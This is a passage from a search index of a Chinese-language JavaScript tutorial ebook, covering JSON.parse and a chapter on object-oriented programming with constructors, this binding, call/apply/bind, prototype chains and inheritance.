<p>\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u53c2\u6570\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u6570\u503c\uff0c\u8868\u793a\u7ed3\u679c\u952e\u503c\u4e4b\u95f4\u7684\u7a7a\u683c\uff08\u7528\u6237\u53cb\u597d\uff09\uff0c\u6b64\u65f6\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f20null\u5373\u53ef\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#jsonparse","title":"JSON.parse()","text":"<p>\u628a\u5b57\u7b26\u4e32\u8f6c\u6362\u6210JSON\u5bf9\u8c61\uff1b\u5982\u679c\u4f20\u5165\u7684\u5bf9\u8c61\u4e0d\u662f\u6709\u6548\u7684\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u4f1a\u62a5\u9519\uff08\u4f8b\u5982\u5b57\u7b26\u4e32\u662f\u5355\u5f15\u53f7\uff09\u5982\u679c\u4e0d\u80fd\u5b8c\u5168\u786e\u5b9a\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u662f\u5426\u662f\u5408\u89c4\u7684\uff0c\u6700\u597d\u505a\u4e00\u4e2a\u9519\u8bef\u5904\u7406\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/","title":"06-\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b","text":""},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#_1","title":"\u7b2c\u516d\u7ae0 \u9762\u5411\u5bf9\u8c61\u7f16\u7a0b","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 15083  \u9605\u8bfb31\u5206\u949f</p> <p>2021-11-17 2023-04-07</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#61-new","title":"6.1 \u5b9e\u4f8b\u5bf9\u8c61\u4e0enew\u547d\u4ee4","text":""},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#_2","title":"\u9762\u5411\u5bf9\u8c61","text":"<p>\u5982\u679c\u8bf4API\u5e93\u662f\u57fa\u672c\u77e5\u8bc6\u70b9\uff0cDOM BOM \u662f\u5e94\u7528\uff0c\u9762\u5411\u5bf9\u8c61\u6700\u7cbe\u9ad3\u7684\u90e8\u5206\uff0c\u8fd9\u662f\u6700\u96be\u7684\u90e8\u5206\u4e4b\u4e00\u3002</p> <p>\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\u7684\u4e09\u5927\u7279\u6027\uff1a\u7ee7\u627f\u6027\u3001\u5c01\u88c5\u6027\u3001\u591a\u6001\u6027</p> <p>\u7ee7\u627f\u6027\uff1a\u901a\u8fc7\u6784\u9020\u51fd\u6570\u521b\u5efa\u5bf9\u8c61\uff08\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u81ea\u6784\u9020\u51fd\u6570\uff0c\u5177\u6709\u539f\u751f\u5bf9\u8c61\u539f\u578b\u94fe\u4e0a\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff09\u5728ES6\u4e2d\uff0c\u4f7f\u7528\u7c7b\u8fdb\u884c\u7ee7\u627f\uff0c\u4e00\u4e2a\u5b50\u7c7b\u4f1a\u7ee7\u627f\u7236\u7c7b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002<code>class Person extends React.Component</code> \u5c31\u662f\u7c7b\u7ee7\u627f\u7684\u57fa\u672c\u5b9e\u73b0\u3002</p> <p>\u5c01\u88c5\u6027\uff1a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u4e2d\u4ee5\u5bf9\u8c61\uff08\u7ec4\u4ef6\uff09\u4e3a\u57fa\u672c\u5355\u5143\u3002\u6700\u5c0f\u7684\u662f\u51fd\u6570\u5185\u90e8\u7684\u5c01\u88c5\uff0c\u95ed\u5305\u5b9e\u73b0\u51fd\u6570\u7684\u5c01\u88c5\uff0c\u7c7b\u5b9e\u73b0\u4e86\u5c5e\u6027\u548c\u65b9\u6cd5\u7684\u5c01\u88c5\u3002\u4e00\u4e2a\u7c7b\u5bf9\u5916\u66b4\u9732\u4e00\u5b9a\u7684\u63a5\u53e3\uff0c\u5e76\u4e0d\u5173\u7cfb\u5185\u90e8\u7684\u4e1a\u52a1\u903b\u8f91\u600e\u6837\u5b9e\u73b0\u3002</p> <p>\u591a\u6001\u6027\uff1a\u5728\u539f\u751fJS\u4e2d\u5c55\u793a\u4e0d\u591a\uff0c\u4e3b\u8981\u5728 Java \u4e2d\u4f7f\u7528\u3002\u5728React\u4e2d\u53ef\u4ee5\u7406\u89e3\u4e3a\uff0c\u540c\u4e00\u4e2a\u7ec4\u4ef6\u5728\u4e0d\u540c\u7684\u5f15\u7528\u73af\u5883\u4e0b\uff0c\u7531\u4e8e\u5916\u90e8\u4f20\u5165\u7684 props \u4e0d\u540c\uff0c\u5c55\u73b0\u4e0d\u540c\u7684\u529f\u80fd\u548c\u6027\u8d28\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#_3","title":"\u6784\u9020\u51fd\u6570\u548c\u5b9e\u4f8b\u5bf9\u8c61","text":"<p>\u6784\u9020\u51fd\u6570\u548c\u666e\u901a\u51fd\u6570\u7c7b\u4f3c\uff08\u6784\u9020\u51fd\u6570\u9996\u5b57\u6bcd\u5927\u5199\uff09\uff0c\u5185\u90e8\u5177\u6709this\uff0c\u6307\u5411\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\uff1b\u4f7f\u7528 new \u547d\u4ee4\u521b\u5efa\u65b0\u5bf9\u8c61\u3002</p> <p>new \u547d\u4ee4\u5c31\u662f\u901a\u8fc7\u6784\u9020\u51fd\u6570\u521b\u5efa\u51fa\u4e00\u4e2a\u65b0\u7684\u5bf9\u8c61\u3002\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u4f20\u53c2\uff0c\u53ef\u4ee5\u4e0d\u4f20\u53c2\uff08\u6839\u636e\u6784\u9020\u51fd\u6570\u7684\u8bbe\u7f6e\uff09\u3002\u5982\u679c\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u65f6\u5019\uff0c\u6784\u9020\u51fd\u6570\u524d\u6ca1\u6709\u4f7f\u7528 new \u5173\u952e\u5b57\uff0c\u90a3\u4e48\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684 this \u5c31\u4f1a\u628a\u5c5e\u6027\u7ed1\u5b9a\u5230\u5168\u5c40\u5bf9\u8c61\u4e0a\uff0c\u8c03\u7528\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u5c31\u662f\u7a7a\uff0c\u5c31\u4f1a\u51fa\u9519\u3002</p> <p>\u5982\u679c\u5728\u4e25\u683c\u6a21\u5f0f\u4e0b\uff0c\u6784\u9020\u51fd\u6570\u524d\u7f3a\u5c11 new \u5c31\u4f1a\u62a5\u9519\uff08\u51fd\u6570\u5185\u90e8\u7684 this \u4e0d\u80fd\u6307\u5411\u5168\u5c40\u5bf9\u8c61\uff09</p> <pre><code>function Student(foo, bar) {\n  'use strict';\n  this.foo = foo;\n  this.bar = bar;\n}\n</code></pre>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#_4","title":"\u6784\u9020\u51fd\u6570\u521b\u5efa\u5bf9\u8c61\u7684\u539f\u7406","text":"<p>\u4f7f\u7528\u6784\u9020\u51fd\u6570\u521b\u5efa\u5bf9\u8c61\u65f6</p> <p>1\u3001\u521b\u9020\u4e00\u4e2a\u7a7a\u5bf9\u8c61</p> <p>2\u3001\u628a\u5bf9\u8c61\u7684prototype\u539f\u578b\u7ed1\u5b9a\u5230\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\u4e0a</p> <p>3\u3001this \u6307\u5411\u53d8\u6210\u65b0\u521b\u5efa\u7684\u5bf9\u8c61</p> <p>4\u3001\u6267\u884c\u6784\u9020\u51fd\u6570\u5185\u90e8\u7684\u4ee3\u7801\uff0c\u7ed9\u5bf9\u8c61\u589e\u52a0\u5c5e\u6027\u548c\u65b9\u6cd5\u3002</p> <p>\u6784\u9020\u51fd\u6570\u59cb\u7ec8\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff0c\u8981\u4e0d\u662f\u5185\u90e8\u521b\u5efa\u7684\u4e00\u4e2a\u5bf9\u8c61 this\uff0c\u8981\u4e0d\u662f return \u8bed\u53e5\u4e2d\u7279\u5b9a\u8fd4\u56de\u5bf9\u8c61\u3002\u5982\u679c\u666e\u901a\u51fd\u6570\u4f7f\u7528 new \u547d\u4ee4\uff0c\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5bf9\u8c61\u3002</p> <pre><code>function _new(/* \u6784\u9020\u51fd\u6570 */ constructor, /* \u6784\u9020\u51fd\u6570\u53c2\u6570 */ params) {\n  // \u5c06 arguments \u5bf9\u8c61\u8f6c\u4e3a\u6570\u7ec4\n  var args = [].slice.call(arguments);\n\n  // \u53d6\u51fa\u6784\u9020\u51fd\u6570\n  var constructor = args.shift();\n\n  // \u521b\u5efa\u4e00\u4e2a\u7a7a\u5bf9\u8c61\uff0c\u7ee7\u627f\u6784\u9020\u51fd\u6570\u7684 prototype \u5c5e\u6027\n  var context = Object.create(constructor.prototype);\n\n  // \u6267\u884c\u6784\u9020\u51fd\u6570\n  var result = constructor.apply(context, args);\n\n  // \u5982\u679c\u8fd4\u56de\u7ed3\u679c\u662f\u5bf9\u8c61\uff0c\u5c31\u76f4\u63a5\u8fd4\u56de\uff0c\u5426\u5219\u8fd4\u56de context \u5bf9\u8c61\n  return (typeof result === 'object' &amp;&amp; result != null) ? result : context;\n}\n\n// \u5b9e\u4f8b\nvar actor = _new(Person, '\u5f20\u4e09', 28);\n</code></pre> <p>\u5982\u679c\u627e\u4e0d\u5230\u6784\u9020\u51fd\u6570\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528 Object.create() \u521b\u5efa\u4e00\u4e2a\u65b0\u5bf9\u8c61</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#62-this","title":"6.2 this","text":"<p>this \u8868\u793a\u5f53\u524d\u73af\u5883\u4e0b\u7684\u5bf9\u8c61\uff08\u53ef\u4ee5\u8c03\u7528\u5bf9\u8c61\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff09\u3002\u5728\u6d4f\u89c8\u5668\u5168\u5c40\u53d8\u91cf\u4e2d\uff0cthis \u8868\u793a\u5f53\u524d\u7684window\uff1b\u5728\u7c7b\u4e2d\uff0cthis \u8868\u793a\u8fd9\u4e2a\u7c7b\uff1b\u5728\u6784\u9020\u51fd\u6570\u4e2d\uff0cthis \u8868\u793a\u65b0\u751f\u6210\u7684\u5bf9\u8c61\uff1b\u65b9\u6cd5\u6216\u8005\u5c5e\u6027\u4e2d\u7684 this\uff0c\u6307\u5411\u8c03\u7528\u65b9\u6cd5\u7684\u5bf9\u8c61\u3002</p> <p>this\u7684\u5b9e\u8d28\uff1a\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u8bbf\u95ee\u51fd\u6570\u5185\u90e8\u7684\u6570\u636e\uff0c\u540c\u65f6\u53ef\u4ee5\u8bbf\u95ee\u51fd\u6570\u5916\u90e8\u5f53\u524d\u4f5c\u7528\u57df\u7684\u6570\u636e\u3002\u540c\u4e00\u4e2a\u51fd\u6570\u53ef\u80fd\u5728\u4e0d\u540c\u4f5c\u7528\u57df\u4f7f\u7528\uff0c\u6240\u4ee5\u5916\u90e8\u7684\u73af\u5883\u4e0d\u540c\uff08\u8c03\u7528\u51fd\u6570\u7684\u5bf9\u8c61\u4e0d\u540c\uff09\u3002\u4f7f\u7528 this \u8868\u793a\u5f53\u524d\u7684\u73af\u5883\uff08\u8c03\u7528\u7684\u5bf9\u8c61\uff09\uff0c\u786e\u4fdd\u51fd\u6570\u5728\u4e0d\u540c\u4f5c\u7528\u57df\u4e2d\u53ef\u4ee5\u8c03\u7528\u5f53\u524d\u7684\u5916\u90e8\u73af\u5883\u53d8\u91cf\u3002</p> <p>\u5bf9\u8c61\u7684\u5b9e\u8d28\uff1a\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61 <code>let foo = {name: \"Mike\"}</code> \u9996\u5148\u5728\u5806\u5185\u5b58\u4e2d\u521b\u5efa\u4e00\u4e2a\u590d\u6742\u5bf9\u8c61 <code>{name: \"Mike\"}</code>\uff0c \u7136\u540e\uff0c\u5728\u6808\u4e2d\u521b\u5efa\u4e00\u4e2a\u7b80\u5355\u53d8\u91cf foo, \u7136\u540e\u628a <code>{name: 'Mike'}</code> \u7684\u5185\u5b58\u5730\u5740\u5173\u8054\u5230\u7b80\u5355\u53d8\u91cf\u4e0a\uff08\u6307\u9488\u6307\u5411\u590d\u6742\u5bf9\u8c61\uff09\u3002\u901a\u8fc7 <code>foo</code> \u8bbf\u95ee\u5bf9\u8c61\u65f6\uff0c\u9996\u5148\u4f1a\u83b7\u53d6\u5185\u5b58\u5730\u5740\uff0c\u7136\u540e\u8bbf\u95ee\u5806\u4e2d\u7684\u6570\u636e\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#_5","title":"\u4f7f\u7528\u573a\u666f","text":"<p>1\u3001\u5168\u5c40\u73af\u5883\u4e2d\u6307\u5411window</p> <p>2\u3001\u6784\u9020\u51fd\u6570\u4e2d\u6307\u5411\u65b0\u521b\u9020\u7684\u5bf9\u8c61</p> <p>3\u3001\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u5177\u6709this\uff0cthis\u6307\u5411\u8c03\u7528\u65b9\u6cd5\u7684\u5bf9\u8c61</p> <p>\u6ce8\u610f\uff1athis \u83b7\u53d6\u5c5e\u6027\u65f6\u4e0d\u80fd\u7ee7\u627f\u4e0a\u5c42\u7684\u5c5e\u6027\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#_6","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>1\u3001\u907f\u514d\u4f7f\u7528\u591a\u5c42 this</p> <pre><code>var o = {\n  f1:function() {\n    console.log(this); // o\n    var f2 = function() {\n      console.log(this); // window\n      // \u5185\u90e8\u51fd\u6570this\u6307\u5411\u5168\u5c40\u53d8\u91cfwindow\n    }();\n  }\n}\no.f1();\n</code></pre> <p>\u53ef\u4ee5\u7528\u53d8\u91cf\u6682\u65f6\u4fdd\u5b58this\uff0c\u8ba9\u5185\u90e8\u51fd\u6570\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u51fd\u6570\u7684\u65b9\u6cd5</p> <pre><code>let foo = {\n  f1: function(){\n    console.log(this);\n    const that = this;\n    let f2 = function() {\n      console.log(that);\n    }();\n  }\n}\nfoo.f1();\n</code></pre> <p>2\u3001\u6570\u7ec4\u4e2d\u907f\u514d\u4f7f\u7528 this(forEach every) \u4e2d\u7684\u6bcf\u4e00\u9879\u5bf9\u5e94\u4e00\u4e2a\u51fd\u6570\uff0c\u5185\u90e8\u7684 this \u6307\u5411window\u3002\u5982\u679c\u5fc5\u987b\u4f7f\u7528 this\uff0c\u53ef\u4ee5\u4f7f\u7528 that = this;</p> <p>3\u3001\u4e8b\u4ef6\u56de\u8c03\u51fd\u6570\u4e2d\u7684this\u4e0d\u4e00\u5b9a\u6307\u5411\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u800c\u662f\u6307\u5411DOM\u5bf9\u8c61\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#this","title":"this \u7ed1\u5b9a\u5bf9\u8c61","text":"<p>1\u3001\u6700\u5e38\u89c1\u7684\u7bad\u5934\u51fd\u6570\uff08ES6\u8be6\u7ec6\u4ecb\u7ecd\uff09</p> <pre><code>function add() {\n  console.log(this);\n}\nadd();\n\nadd = () =&gt; {\n    console.log(this);\n}\nadd();\n</code></pre> <p>\u7b2c\u4e8c\u4e2a\u7bad\u5934\u51fd\u6570\u4f1a\u7ed1\u5b9a\u5f53\u524d\u5bf9\u8c61\uff0c\u5185\u90e8\u7684this\u53ef\u4ee5\u6307\u5411\u5f53\u524d\u5bf9\u8c61\u3002</p> <p>2\u3001call \u53ef\u4ee5\u6539\u53d8this\u7684\u6307\u5411</p> <pre><code>Function.call(obj, para1, para2);\n\nfunction(para1, para2) {\n  console.log(this === obj);\n}\n// obj\u53ef\u4ee5\u4f7f\u7528\u67d0\u4e2a\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\u7684this\u6307\u5411obj\u5bf9\u8c61\u3002\u5982\u679c\u4f20\u5165\u7684\u5bf9\u8c61\u662f undefined, null\uff0c\u7a7a\uff0cthis \u6307\u5411\u5168\u5c40\u5bf9\u8c61\u3002call \u51fd\u6570\u4f7f\u7528\u5f88\u591a\u3002\nArray.prototype.splice(arguments, para1, para2);\n// \u53ef\u4ee5\u628a\u4e00\u4e2a\u4f2a\u6570\u7ec4(\u5bf9\u8c61)\u4f7f\u7528call\u65b9\u6cd5\uff0c\u7ed1\u5b9a\u4e00\u4e2asplice\u7684\u6570\u7ec4\u65b9\u6cd5\n</code></pre> <p>3\u3001apply \u53ef\u4ee5\u6539\u53d8 this \u7684\u6307\u5411\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u6570\u7ec4\uff08\u51fd\u6570\u7684\u53c2\u6570\u6570\u7ec4\uff09</p> <pre><code>function add(a, b) {\n  console.log(a + b);\n  return a + b;\n}\nlet obj = {};\nadd.call(obj, 1, 2);\nadd.apply(obj, [1, 2]);\n</code></pre> <p>call \u65b9\u6cd5\u4f20\u5165\u4e24\u4e2a\u5355\u72ec\u53c2\u6570\u76f8\u5bf9\u597d\u7528\uff0capply \u8fd8\u9700\u8981\u6784\u9020\u4e00\u4e2a\u53c2\u6570\u6570\u7ec4\u3002</p> <p>\u53ef\u4ee5\u5c06Math\u5bf9\u8c61\u7684\u65b9\u6cd5\u4f7f\u7528\u5230\u6570\u7ec4\u4e0a\u9762</p> <pre><code>let arr = [1, 2, 3, 5];\nMath.max.call(null, arr);\n\nlet arguments = {0: 1, length: 2}; // \u51fd\u6570\u7684\u53c2\u6570\u6784\u6210\u7684\u4f2a\u6570\u7ec4\nArray.prototype.slice.apply(arguments); // \u4f2a\u6570\u7ec4\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u6cd5\n</code></pre> <p>4\u3001bind \u628a\u51fd\u6570\u7684\u65b9\u6cd5\u7ed1\u5b9a\u5230\u67d0\u4e2a\u5bf9\u8c61\u4e0a\u9762</p> <pre><code>let counter = {\n  count: 0,\n  increase: function() {\n    this.count++;\n  }\n};\nlet obj = {\n  count: 100\n}\nlet func = counter.increase.bind(counter);\nfunc();\nconsole.log(counter.count);\n\nlet func2 = counter.increase.bind(obj);\nfunc2();\nconsole.log(obj.count);\n</code></pre> <p>\u540c\u4e00\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u7528\u5728\u4e0d\u540c\u7684\u5bf9\u8c61\u4e0a\u9762</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#63","title":"6.3 \u5bf9\u8c61\u7684\u7ee7\u627f","text":"<p>ES5\u901a\u8fc7\u539f\u578b\u5bf9\u8c61\u7ee7\u627f\uff0cES6\u901a\u8fc7\u7c7b\u7ee7\u627f\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#1-prototype","title":"1\u3001\u539f\u578b\u5bf9\u8c61 prototype","text":"<p>\u4e3a\u4ec0\u4e48\u9700\u8981\u539f\u578b\u5bf9\u8c61\uff1f\u5982\u679c\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u521b\u5efa\u4e86\u591a\u4e2a\u5bf9\u8c61\uff0c\u90a3\u4e48\u591a\u4e2a\u5bf9\u8c61\u4e2d\u5177\u6709\u516c\u5171\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff08\u4f1a\u6d6a\u8d39\u6027\u80fd\uff09\u5982\u679c\u76f4\u63a5\u5728\u6784\u9020\u51fd\u6570\u4e2d\u8bbe\u7f6e\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u90a3\u4e48\u521b\u5efa\u7684\u591a\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u8bbf\u95ee\u539f\u578b\u5bf9\u8c61\u4e2d\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\uff0c\u8282\u7701\u5185\u5b58\u3002\u901a\u8fc7\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u8bbf\u95ee\u539f\u578b\u5bf9\u8c61\u4e0a\u7684\u5c5e\u6027\uff0c\u5982\u679c\u539f\u578b\u5bf9\u8c61\u4e0a\u7684\u5c5e\u6027\u6539\u53d8\u540e\uff0c\u90a3\u4e48\u5b9e\u4f8b\u5bf9\u8c61\u8bbf\u95ee\u7684\u5c5e\u6027\u90fd\u4f1a\u6539\u53d8\u3002<code>Cat.prototype.name = \"Mike\"</code> \u5982\u679c\u5b9e\u4f8b\u5bf9\u8c61\u81ea\u8eab\u5177\u6709\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5c31\u4e0d\u4f1a\u5230\u539f\u578b\u94fe\u4e0a\u5bfb\u627e\u8fd9\u4e2a\u5c5e\u6027\uff08\u5728\u539f\u578b\u5bf9\u8c61\u4e0a\u8bbe\u7f6e\u7684\u5c5e\u6027\u4e0d\u4f1a\u8d77\u4f5c\u7528\uff09\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#2-prototype-chain","title":"2\u3001\u539f\u578b\u94fe prototype chain","text":"<p>\u6bcf\u4e00\u4e2a\u5bf9\u8c61\u90fd\u6709\u4e00\u4e2a\u539f\u578b\u5bf9\u8c61\uff0c\u8fd9\u4e2a\u539f\u578b\u5bf9\u8c61\u672c\u8d28\u4e0a\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002\u5bf9\u8c61\u548c\u539f\u578b\u5bf9\u8c61\u6784\u6210\u7684\u94fe\u5c31\u662f\u539f\u578b\u94fe\u3002Object.prototype \u662f null \u8fd9\u5c31\u662f\u539f\u578b\u5bf9\u8c61\u7684\u8d77\u70b9\u3002\u8bbf\u95ee\u5c5e\u6027\u6216\u5bf9\u8c61\u65f6\uff0c\u9996\u5148\u8bbf\u95ee\u5b9e\u4f8b\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u5982\u679c\u6ca1\u6709\u4f1a\u5728\u539f\u578b\u94fe\u4e0a\u4f9d\u6b21\u67e5\u627e\uff0c\u5982\u679c\u627e\u4e0d\u5230\u5c31\u8fd4\u56de undefined\u3002\uff08\u5728\u539f\u578b\u94fe\u4e0a\u67e5\u627e\u5c5e\u6027\u548c\u65b9\u6cd5\u6d88\u8017\u6027\u80fd\uff0c\u5bfb\u627e\u67d0\u4e2a\u4e0d\u5b58\u5728\u7684\u5c5e\u6027\u4f1a\u904d\u5386\u6574\u4e2a\u539f\u578b\u94fe\uff09\u3002\u5982\u679c\u8ba9\u67d0\u4e2a\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\u5bf9\u8c61\u6307\u5411\u6570\u7ec4\u5bf9\u8c61\uff0c\u90a3\u4e48\u6539\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u7ee7\u627f\uff08\u8c03\u7528\uff09\u6570\u7ec4\u7684\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#3constructor","title":"3\u3001constructor \u6784\u9020\u5668","text":"<p>\u539f\u578b\u5bf9\u8c61\u7684 constructor \u6307\u5411\u6784\u9020\u51fd\u6570\u672c\u8eab\u3002<code>P.prototype.constructor === P</code></p> <p>\u4f7f\u7528\u6784\u9020\u51fd\u6570\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u6784\u9020\u51fd\u6570\u662f\u4ec0\u4e48\uff0c\u90a3\u4e48\u5b9e\u4f8b\u5bf9\u8c61\u53ef\u4ee5\u8bbf\u95ee\u6784\u9020\u51fd\u6570\uff0c obj .constructor\uff0c\u6216\u8005\u76f4\u63a5\u4f7f\u7528\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u65b0\u5efa\u53e6\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff08\u7ee7\u627f\u81ea\u76f8\u540c\u7684\u6784\u9020\u51fd\u6570\uff09</p> <pre><code>function Cat () {}\nlet obj1 = new Cat();\nlet obj2 = new Cat();\nlet obj3 = obj1.constructor();\nobj3 instanceof Cat // true\n</code></pre> <p>\u5982\u679c\u4fee\u6539\u4e86\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\uff0cobj.prototype = function(){}\uff0c \u90a3\u4e48\u5373\u4f7f\u539f\u578b\u5bf9\u8c61\u4e0a\u7684 constructor \u8fd8\u5b58\u5728\uff0c\u4f46\u662f\u83b7\u53d6\u5230\u7684\u5c31\u4e0d\u662f\u539f\u6765\u7684\u6784\u9020\u51fd\u6570\uff08\u539f\u578b\u94fe\u53d8\u4e86\uff09\u3002\u6240\u4ee5\uff0c\u5982\u679c\u5fc5\u987b\u4fee\u6539\u5b9e\u4f8b\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\uff0c\u6700\u597d\u540c\u65f6\u4fee\u6539\u539f\u578b\u5bf9\u8c61\u7684 constructor\uff0c\u6216\u8005\u76f4\u63a5\u6539\u539f\u578b\u5bf9\u8c61\u4e0a\u7684\u67d0\u4e2a\u65b9\u6cd5\uff08\u800c\u4e0d\u662f\u6539\u6574\u4e2a\u539f\u578b\u5bf9\u8c61\uff09</p> <pre><code>Obj.prototype = {\n  constructor: Obj,\n  run: function(){}\n}\n\nObj.prototype.run = function() {}\n</code></pre>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#4instanceof","title":"4\u3001instanceof","text":"<p>\u5224\u65ad\u67d0\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u662f\u5426\u662f\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\uff1binstanceof \u4f1a\u6cbf\u7740\u539f\u578b\u94fe\u68c0\u67e5\uff0c\u6240\u4ee5\u53ef\u80fd\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u662f\u591a\u4e2a\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\uff08\u539f\u578b\u94fe\u4e0a\u7684\u5bf9\u8c61\uff09\u3002\u4efb\u4f55\u5bf9\u8c61\uff08\u9664\u53bb null\uff09\u90fd\u662f Object \u5bf9\u8c61\u7684\u5b9e\u4f8b\uff0c\u53ef\u4ee5\u68c0\u67e5\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u662fnull\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 instanceof \u5224\u65ad\u503c\u7684\u7c7b\u578b</p> <pre><code>a instanceof Array\nb instanceof Object\n// \u7279\u6b8a\u60c5\u51b5\uff1a\u5bf9\u8c61\n</code></pre>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#5","title":"5\u3001\u6784\u9020\u51fd\u6570\u7684\u7ee7\u627f","text":"<p>\u5b50\u7c7b\u7684\u6784\u9020\u51fd\u6570\u5185\u90e8\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020\u51fd\u6570\uff0c\u7136\u540e\u8ba9\u5b50\u7c7b\u7684\u539f\u578b\u6307\u5411\u7236\u7c7b\u7684\u539f\u578b\u3002</p> <pre><code>function Sub(value) {\n  Super.call(this);\n  this.props = value;\n}\n\nSub.prototype = Object.create(Super.prototype);\nSub.prototype.constructor = Sub;\nSub.prototype.method = ..;\n</code></pre>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#6","title":"6\u3001\u591a\u91cd\u7ee7\u627f","text":"<p>\u4f7f\u7528call\u51fd\u6570\u5b9e\u73b0\u4e00\u4e2a\u5bf9\u8c61\u7ee7\u627f\u591a\u4e2a\u5bf9\u8c61(\u6df7\u5165\u5f0f\u7ee7\u627f)</p> <pre><code>function M1() {\n  this.name = \"Michael\";\n}\nfunction M2() {\n  this.lastName = 'An';\n}\nfunction Fun() {\n  M1.call(this);\n  M2.call(this);\n}\n// 